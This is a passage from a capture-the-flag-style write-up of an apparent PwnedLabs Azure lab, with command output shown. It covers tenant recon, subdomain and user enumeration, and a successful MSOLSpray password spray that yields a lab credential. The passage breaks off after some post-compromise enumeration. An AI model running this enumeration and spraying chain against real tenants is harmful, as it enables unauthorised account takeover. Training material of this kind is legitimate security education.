+</span></span><span class="line"><span class="cl"><span class="n">Tenant</span> <span class="n">Locale</span>                        <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Federation</span> <span class="n">Global</span> <span class="n">Version</span>            <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">User</span> <span class="n">State</span>                           <span class="err">:</span> <span class="mf">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Desktop</span> <span class="n">Sso</span> <span class="n">Enabled</span>                  <span class="err">:</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Get-AADIntTenantID</span> <span class="n">-Domain</span> <span class="n">megabigtech</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl"><span class="n">2590ccef</span><span class="p">-</span><span class="mf">687d</span><span class="p">-</span><span class="n">493b-ae8d</span><span class="p">-</span><span class="n">441cbab63a72</span>
+</span></span></code></pre></div><p>We can also run the next command, which looks to answer the following questions as described by <strong>PwnedLabs</strong> :</p>
+<table>
+  <thead>
+      <tr>
+          <th>Value</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>DNS</td>
+          <td>Does the DNS record exist?</td>
+      </tr>
+      <tr>
+          <td><a href="https://learn.microsoft.com/en-us/microsoft-365/enterprise/external-domain-name-system-records?#external-dns-records-required-for-email-in-office-365-exchange-online">MX</a></td>
+          <td>Does the MX point to Office 365?</td>
+      </tr>
+      <tr>
+          <td><a href="https://learn.microsoft.com/en-us/microsoft-365/enterprise/external-domain-name-system-records?#external-dns-records-required-for-email-in-office-365-exchange-online">SPF</a></td>
+          <td>Does the SPF contain Exchange Online?</td>
+      </tr>
+      <tr>
+          <td><a href="https://learn.microsoft.com/en-us/microsoft-365/enterprise/deploy-identity-solution-identity-model?#authentication-for-hybrid-identity">Type</a></td>
+          <td>Federated or Managed</td>
+      </tr>
+      <tr>
+          <td><a href="https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/email-authentication-dmarc-configure">DMARC</a></td>
+          <td>Is the DMARC record configured?</td>
+      </tr>
+      <tr>
+          <td><a href="https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/email-authentication-dkim-configure">DKIM</a></td>
+          <td>Is the DKIM record configured?</td>
+      </tr>
+      <tr>
+          <td><a href="https://techcommunity.microsoft.com/t5/exchange-team-blog/introducing-mta-sts-for-exchange-online/ba-p/3106386">MTA-STS</a></td>
+          <td>Is the MTA-STS recored configured?</td>
+      </tr>
+      <tr>
+          <td>STS</td>
+          <td>The FQDN of the federated IdP’s (Identity Provider) STS (Security Token Service) server</td>
+      </tr>
+      <tr>
+          <td><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/operations/create-a-relying-party-trust">RPS</a></td>
+          <td>Relaying parties of STS (AD FS). Requires -GetRelayingParties switch.</td>
+      </tr>
+  </tbody>
+</table>
+<p>Source: <a href="https://aadinternals.com/aadinternals/#invoke-aadintreconasoutsider">https://aadinternals.com/aadinternals/#invoke-aadintreconasoutsider</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Invoke-AADIntReconAsOutsider</span> <span class="n">-Domain</span> <span class="s2">&#34;megabigtech.com&#34;</span> <span class="p">|</span> <span class="nb">Format-Table</span>
+</span></span><span class="line"><span class="cl"><span class="n">Tenant</span> <span class="n">brand</span><span class="err">:</span>       <span class="k">Default</span> <span class="n">Directory</span>
+</span></span><span class="line"><span class="cl"><span class="n">Tenant</span> <span class="n">name</span><span class="err">:</span>        <span class="n">iancloudpwned</span><span class="p">.</span><span class="py">onmicrosoft</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Tenant</span> <span class="n">id</span><span class="err">:</span>          <span class="n">2590ccef</span><span class="p">-</span><span class="mf">687d</span><span class="p">-</span><span class="n">493b-ae8d</span><span class="p">-</span><span class="n">441cbab63a72</span>
+</span></span><span class="line"><span class="cl"><span class="n">Tenant</span> <span class="n">region</span><span class="err">:</span>      <span class="n">EU</span>
+</span></span><span class="line"><span class="cl"><span class="n">DesktopSSO</span> <span class="n">enabled</span><span class="err">:</span> <span class="n">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Name</span>                                 <span class="n">DNS</span>    <span class="n">MX</span>   <span class="n">SPF</span> <span class="n">DMARC</span>  <span class="n">DKIM</span> <span class="nb">MTA-STS</span> <span class="nb">Type </span>   <span class="n">STS</span>                                    
+</span></span><span class="line"><span class="cl"><span class="p">----</span>                                 <span class="p">---</span>    <span class="p">--</span>   <span class="p">---</span> <span class="p">-----</span>  <span class="p">----</span> <span class="p">-------</span> <span class="p">----</span>    <span class="p">---</span>                                    
+</span></span><span class="line"><span class="cl"><span class="n">iancloudpwned</span><span class="p">.</span><span class="py">mail</span><span class="p">.</span><span class="py">onmicrosoft</span><span class="p">.</span><span class="py">com</span> <span class="n">False</span> <span class="n">False</span> <span class="n">False</span>       <span class="n">False</span>   <span class="n">False</span> <span class="n">Managed</span>                                        
+</span></span><span class="line"><span class="cl"><span class="n">iancloudpwned</span><span class="p">.</span><span class="py">onmicrosoft</span><span class="p">.</span><span class="py">com</span>      <span class="n">False</span> <span class="n">False</span> <span class="n">False</span>       <span class="n">False</span>   <span class="n">False</span> <span class="n">Managed</span>                                        
+</span></span><span class="line"><span class="cl"><span class="nb">international-am</span><span class="p">.</span><span class="py">com</span>               <span class="n">False</span> <span class="n">False</span> <span class="n">False</span>       <span class="n">False</span>   <span class="n">False</span> <span class="n">Managed</span>                                        
+</span></span><span class="line"><span class="cl"><span class="n">megabigtech</span><span class="p">.</span><span class="py">com</span>                    <span class="n">False</span> <span class="n">False</span> <span class="n">False</span>       <span class="n">False</span>   <span class="n">False</span> <span class="n">Managed</span> 
+</span></span></code></pre></div><p>We can also gather subdomains using the  <a href="https://github.com/yuyudhn/AzSubEnum">AzSubEnum</a> tool, a specialized subdomain enumeration tool tailored for Azure services.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">yuyudhn</span><span class="p">/</span><span class="n">AzSubEnum</span><span class="p">.</span><span class="py">git</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cloning</span> <span class="n">into</span> <span class="s1">&#39;AzSubEnum&#39;</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">remote</span><span class="err">:</span> <span class="n">Enumerating</span> <span class="n">objects</span><span class="err">:</span> <span class="mf">45</span><span class="p">,</span> <span class="n">done</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">remote</span><span class="err">:</span> <span class="n">Counting</span> <span class="n">objects</span><span class="err">:</span> <span class="mf">100</span><span class="p">%</span> <span class="p">(</span><span class="mf">45</span><span class="p">/</span><span class="mf">45</span><span class="p">),</span> <span class="n">done</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">remote</span><span class="err">:</span> <span class="n">Compressing</span> <span class="n">objects</span><span class="err">:</span> <span class="mf">100</span><span class="p">%</span> <span class="p">(</span><span class="mf">38</span><span class="p">/</span><span class="mf">38</span><span class="p">),</span> <span class="n">done</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">remote</span><span class="err">:</span> <span class="n">Total</span> <span class="mf">45</span> <span class="p">(</span><span class="n">delta</span> <span class="mf">20</span><span class="p">),</span> <span class="n">reused</span> <span class="mf">19</span> <span class="p">(</span><span class="n">delta</span> <span class="mf">6</span><span class="p">),</span> <span class="nb">pack-reused</span> <span class="mf">0</span> <span class="p">(</span><span class="n">from</span> <span class="mf">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Receiving</span> <span class="n">objects</span><span class="err">:</span> <span class="mf">100</span><span class="p">%</span> <span class="p">(</span><span class="mf">45</span><span class="p">/</span><span class="mf">45</span><span class="p">),</span> <span class="mf">386.80</span> <span class="n">KiB</span> <span class="p">|</span> <span class="mf">235.00</span> <span class="n">KiB</span><span class="p">/</span><span class="n">s</span><span class="p">,</span> <span class="n">done</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Resolving</span> <span class="n">deltas</span><span class="err">:</span> <span class="mf">100</span><span class="p">%</span> <span class="p">(</span><span class="mf">20</span><span class="p">/</span><span class="mf">20</span><span class="p">),</span> <span class="n">done</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">cd </span><span class="p">./</span><span class="n">AzSubEnum</span><span class="p">/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">/</span><span class="n">AzSubEnum</span><span class="p">&gt;</span> <span class="n">python3</span> <span class="n">azsubenum</span><span class="p">.</span><span class="py">py</span> <span class="n">-b</span> <span class="n">megabigtech</span> <span class="p">-</span><span class="n">-thread</span> <span class="mf">10</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Discovered</span> <span class="n">Subdomains</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">App</span> <span class="n">Services</span> <span class="p">-</span> <span class="n">Management</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">---------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">megabigtech</span><span class="p">.</span><span class="py">scm</span><span class="p">.</span><span class="py">azurewebsites</span><span class="p">.</span><span class="py">net</span>      
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">App</span> <span class="n">Services</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">-----------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">megabigtech</span><span class="p">.</span><span class="py">azurewebsites</span><span class="p">.</span><span class="py">net</span> 
+</span></span></code></pre></div><p>Navigating to the discovered <strong>App Services</strong> subdomain we have the below web page</p>
+<p><img loading="lazy" src="https://i.imgur.com/ioB50En.png"></p>
+<p>According to the above screenshots</p>
+<ul>
+<li>We have some employees and their roles assigned</li>
+<li>We also have an email format ; &ldquo;<code>Kato.Sara@megabigtech.com</code>&rdquo; which could be used to create other emails also as shown below :</li>
+</ul>
+<pre tabindex="0"><code>yuki.tanaka@megabigtech.com
+yamamoto.sota@megabigtech.com
+takahashi.hina@megabigtech.com
+kato.sara@megabigtech.com
+</code></pre><p>Since we now have a username wordlist we can manually test them by going to <a href="https://login.microsoftonline.com/">https://login.microsoftonline.com</a>. If a username is valid we would be prompted for a password else, a message &ldquo;<code>This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.</code>&rdquo; would be returned</p>
+<p>It is possible to automate this whole process though by using a tool called  <a href="https://github.com/0xZDH/Omnispray">Omnispray</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">0xZDH</span><span class="p">/</span><span class="n">Omnispray</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cloning</span> <span class="n">into</span> <span class="s1">&#39;Omnispray&#39;</span><span class="p">...</span>            
+</span></span><span class="line"><span class="cl"><span class="n">remote</span><span class="err">:</span> <span class="n">Enumerating</span> <span class="n">objects</span><span class="err">:</span> <span class="mf">460</span><span class="p">,</span> <span class="n">done</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">remote</span><span class="err">:</span> <span class="n">Counting</span> <span class="n">objects</span><span class="err">:</span> <span class="mf">100</span><span class="p">%</span> <span class="p">(</span><span class="mf">45</span><span class="p">/</span><span class="mf">45</span><span class="p">),</span> <span class="n">done</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">remote</span><span class="err">:</span> <span class="n">Compressing</span> <span class="n">objects</span><span class="err">:</span> <span class="mf">100</span><span class="p">%</span> <span class="p">(</span><span class="mf">31</span><span class="p">/</span><span class="mf">31</span><span class="p">),</span> <span class="n">done</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">remote</span><span class="err">:</span> <span class="n">Total</span> <span class="mf">460</span> <span class="p">(</span><span class="n">delta</span> <span class="mf">27</span><span class="p">),</span> <span class="n">reused</span> <span class="mf">19</span> <span class="p">(</span><span class="n">delta</span> <span class="mf">14</span><span class="p">),</span> <span class="nb">pack-reused</span> <span class="mf">415</span> <span class="p">(</span><span class="n">from</span> <span class="mf">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Receiving</span> <span class="n">objects</span><span class="err">:</span> <span class="mf">100</span><span class="p">%</span> <span class="p">(</span><span class="mf">460</span><span class="p">/</span><span class="mf">460</span><span class="p">),</span> <span class="mf">87.13</span> <span class="n">KiB</span> <span class="p">|</span> <span class="mf">97.00</span> <span class="n">KiB</span><span class="p">/</span><span class="n">s</span><span class="p">,</span> <span class="n">done</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Resolving</span> <span class="n">deltas</span><span class="err">:</span> <span class="mf">100</span><span class="p">%</span> <span class="p">(</span><span class="mf">302</span><span class="p">/</span><span class="mf">302</span><span class="p">),</span> <span class="n">done</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">cd </span><span class="p">./</span><span class="n">Omnispray</span><span class="p">/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">/</span><span class="n">Omnispray</span><span class="p">&gt;</span> <span class="n">nano</span> <span class="n">users</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">/</span><span class="n">Omnispray</span><span class="p">&gt;</span> <span class="n">python3</span> <span class="n">omnispray</span><span class="p">.</span><span class="py">py</span> <span class="p">-</span><span class="n">-type</span> <span class="n">enum</span> <span class="n">-uf</span> <span class="n">users</span><span class="p">.</span><span class="py">txt</span> <span class="p">-</span><span class="n">-module</span> <span class="n">o365_enum_office</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="p">***</span> <span class="n">Omnispray</span> <span class="p">***</span>            
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&gt;---------------------------------------&lt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="p">&gt;</span> <span class="n">version</span>        <span class="err">:</span>  <span class="mf">0.1</span><span class="p">.</span><span class="py">4</span>
+</span></span><span class="line"><span class="cl">   <span class="p">&gt;</span> <span class="n">module</span>         <span class="err">:</span>  <span class="n">o365_enum_office</span>
+</span></span><span class="line"><span class="cl">   <span class="p">&gt;</span> <span class="nb">type </span>          <span class="err">:</span>  <span class="n">enum</span>        
+</span></span><span class="line"><span class="cl">   <span class="p">&gt;</span> <span class="n">userfile</span>       <span class="err">:</span>  <span class="n">users</span><span class="p">.</span><span class="py">txt</span> 
+</span></span><span class="line"><span class="cl">   <span class="p">&gt;</span> <span class="n">count</span>          <span class="err">:</span>  <span class="mf">1</span> <span class="n">passwords</span><span class="p">/</span><span class="n">spray</span>  
+</span></span><span class="line"><span class="cl">   <span class="p">&gt;</span> <span class="n">lockout</span>        <span class="err">:</span>  <span class="mf">15.0</span> <span class="n">minutes</span>
+</span></span><span class="line"><span class="cl">   <span class="p">&gt;</span> <span class="n">wait</span>           <span class="err">:</span>  <span class="mf">5.0</span>               
+</span></span><span class="line"><span class="cl">   <span class="p">&gt;</span> <span class="n">timeout</span>        <span class="err">:</span>  <span class="mf">25</span> <span class="n">seconds</span>
+</span></span><span class="line"><span class="cl">   <span class="p">&gt;</span> <span class="n">pause</span>          <span class="err">:</span>  <span class="mf">0.25</span> <span class="n">seconds</span>
+</span></span><span class="line"><span class="cl">   <span class="p">&gt;</span> <span class="n">rate</span>           <span class="err">:</span>  <span class="mf">10</span> <span class="n">threads</span>
+</span></span><span class="line"><span class="cl">   <span class="p">&gt;</span> <span class="nb">start </span>         <span class="err">:</span>  <span class="mf">2024</span><span class="p">-</span><span class="mf">10</span><span class="p">-</span><span class="mf">26</span> <span class="mf">15</span><span class="err">:</span><span class="mf">15</span><span class="err">:</span><span class="mf">52</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&gt;---------------------------------------&lt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mf">2024</span><span class="p">-</span><span class="mf">10</span><span class="p">-</span><span class="mf">26</span> <span class="mf">15</span><span class="err">:</span><span class="mf">15</span><span class="err">:</span><span class="mf">52</span><span class="p">,</span><span class="mf">906</span><span class="p">]</span> <span class="n">INFO</span> <span class="err">:</span> <span class="n">Generating</span> <span class="n">prerequisite</span> <span class="n">data</span> <span class="n">via</span> <span class="n">office</span><span class="p">.</span><span class="py">com</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mf">2024</span><span class="p">-</span><span class="mf">10</span><span class="p">-</span><span class="mf">26</span> <span class="mf">15</span><span class="err">:</span><span class="mf">16</span><span class="err">:</span><span class="mf">17</span><span class="p">,</span><span class="mf">914</span><span class="p">]</span> <span class="n">INFO</span> <span class="err">:</span> <span class="n">Enumerating</span> <span class="mf">4</span> <span class="n">users</span> <span class="n">via</span> <span class="s1">&#39;o365_enum_office&#39;</span> <span class="n">module</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mf">2024</span><span class="p">-</span><span class="mf">10</span><span class="p">-</span><span class="mf">26</span> <span class="mf">15</span><span class="err">:</span><span class="mf">16</span><span class="err">:</span><span class="mf">30</span><span class="p">,</span><span class="mf">667</span><span class="p">]</span> <span class="n">INFO</span> <span class="err">:</span> <span class="p">[</span> <span class="p">+</span> <span class="p">]</span> <span class="n">yuki</span><span class="p">.</span><span class="n">tanaka</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="p">-</span> <span class="p">]</span> <span class="n">yamamoto</span><span class="p">.</span><span class="n">sota</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mf">2024</span><span class="p">-</span><span class="mf">10</span><span class="p">-</span><span class="mf">26</span> <span class="mf">15</span><span class="err">:</span><span class="mf">16</span><span class="err">:</span><span class="mf">32</span><span class="p">,</span><span class="mf">797</span><span class="p">]</span> <span class="n">INFO</span> <span class="err">:</span> <span class="n">Results</span> <span class="n">can</span> <span class="n">be</span> <span class="n">found</span> <span class="k">in</span><span class="err">:</span> <span class="s1">&#39;/home/sec-fortress/Az_lab/Omnispray/results/&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mf">2024</span><span class="p">-</span><span class="mf">10</span><span class="p">-</span><span class="mf">26</span> <span class="mf">15</span><span class="err">:</span><span class="mf">16</span><span class="err">:</span><span class="mf">32</span><span class="p">,</span><span class="mf">797</span><span class="p">]</span> <span class="n">INFO</span> <span class="err">:</span> <span class="n">Valid</span> <span class="n">user</span> <span class="n">accounts</span><span class="err">:</span> <span class="mf">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mf">2024</span><span class="p">-</span><span class="mf">10</span><span class="p">-</span><span class="mf">26</span> <span class="mf">15</span><span class="err">:</span><span class="mf">16</span><span class="err">:</span><span class="mf">33</span><span class="p">,</span><span class="mf">049</span><span class="p">]</span> <span class="n">INFO</span> <span class="err">:</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">/</span><span class="n">Omnispray</span><span class="p">/</span><span class="n">omnispray</span><span class="p">.</span><span class="py">py</span> <span class="n">executed</span> <span class="k">in</span> <span class="mf">40.26</span> <span class="n">seconds</span><span class="p">.</span>
+</span></span></code></pre></div><p>Since we now have a valid set of account we can go ahead and perform a credential stuffing or password spraying attack as this are definitely noisy and risk detection (and locking accounts), and so it&rsquo;s often worth exploring other avenues.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">wget </span><span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">raw</span><span class="p">.</span><span class="py">githubusercontent</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">dafthack</span><span class="p">/</span><span class="n">MSOLSpray</span><span class="p">/</span><span class="n">refs</span><span class="p">/</span><span class="n">heads</span><span class="p">/</span><span class="n">master</span><span class="p">/</span><span class="n">MSOLSpray</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Saving</span> <span class="n">to</span><span class="err">:</span> <span class="err">‘</span><span class="n">MSOLSpray</span><span class="p">.</span><span class="n">ps1</span><span class="err">’</span><span class="n">MSOLSpray</span><span class="p">.</span><span class="py">ps1</span>                                   <span class="mf">100</span><span class="p">%[=====================================================================================================&gt;]</span>   <span class="mf">8</span><span class="p">.</span><span class="n">52K</span>  <span class="mf">32.0</span><span class="p">KB/</span><span class="n">s</span>    <span class="k">in</span> <span class="mf">0</span><span class="p">.</span><span class="n">3s</span>                                                                                                                                                                                                   <span class="mf">2024</span><span class="p">-</span><span class="mf">10</span><span class="p">-</span><span class="mf">26</span> <span class="mf">15</span><span class="err">:</span><span class="mf">25</span><span class="err">:</span><span class="mf">51</span> <span class="p">(</span><span class="mf">32.0</span> <span class="n">KB</span><span class="p">/</span><span class="n">s</span><span class="p">)</span> <span class="p">-</span> <span class="err">‘</span><span class="n">MSOLSpray</span><span class="p">.</span><span class="n">ps1</span><span class="err">’</span> <span class="n">saved</span> <span class="p">[</span><span class="mf">8727</span><span class="p">/</span><span class="mf">8727</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">## Import module with dot sourcing</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="p">.</span> <span class="p">.\</span><span class="n">MSOLSpray</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">echo </span><span class="s2">&#34;yuki.tanaka@megabigtech.com&#34;</span> <span class="p">&gt;</span> <span class="n">valid_user</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Invoke-MSOLSpray</span> <span class="n">-UserList</span> <span class="p">./</span><span class="n">valid_user</span> <span class="n">-Password</span> <span class="s2">&#34;MegaDev79$&#34;</span> <span class="n">-Verbose</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">There</span> <span class="n">are</span> <span class="mf">1</span> <span class="n">total</span> <span class="n">users</span> <span class="n">to</span> <span class="n">spray</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Now</span> <span class="n">spraying</span> <span class="n">Microsoft</span> <span class="n">Online</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Current</span> <span class="n">date</span> <span class="n">and</span> <span class="n">time</span><span class="err">:</span> <span class="mf">10</span><span class="p">/</span><span class="mf">26</span><span class="p">/</span><span class="mf">2024</span> <span class="mf">15</span><span class="err">:</span><span class="mf">27</span><span class="err">:</span><span class="mf">00</span>
+</span></span><span class="line"><span class="cl"><span class="n">VERBOSE</span><span class="err">:</span> <span class="n">POST</span> <span class="n">with</span> <span class="mf">195</span><span class="n">-byte</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">VERBOSE</span><span class="err">:</span> <span class="n">received</span> <span class="mf">3677</span><span class="n">-byte</span> <span class="n">response</span> <span class="n">of</span> <span class="n">content</span> <span class="nb">type </span><span class="n">application</span><span class="p">/</span><span class="n">json</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">SUCCESS</span><span class="p">!</span> <span class="n">yuki</span><span class="p">.</span><span class="n">tanaka</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span> <span class="err">:</span> <span class="n">MegaDev79</span><span class="p">$</span>  
+</span></span></code></pre></div><blockquote>
+<p>&ldquo;<strong>Note</strong>: very often we wouldn’t be able to just log directly into a tenant over the Internet as MFA is getting more common place. Other guided labs from Pwned Labs where explored on how to check if MFA is enabled for gaps and to gain access.&rdquo; &ndash; <em><strong>PwnedLabs</strong></em></p>
+</blockquote>
+<p>We can then attempt to gather as much information as possible with our credentialed access using the Az Powershell and Microsoft Graph PowerShell SDK modules</p>
+<pre tabindex="0"><code>Connect-AzAccount
+Connect-MgGraph
+</code></pre><p>To Enumerate all users in the tenant we can issue the following command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Get-AzADUser</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/SD3TJ47.jpeg"></p>
+<p>Here are some few questions to ask after getting foothold with a compromised user as described by <strong>PwnedLabs</strong>:</p>
+<ul>
+<li>Is the user part of any group? If so, does this group has any role assigned to it?</li>
+<li>Does the user have any Azure Entra ID roles assigned to them?</li>
+<li>Which objects has this user created?</li>
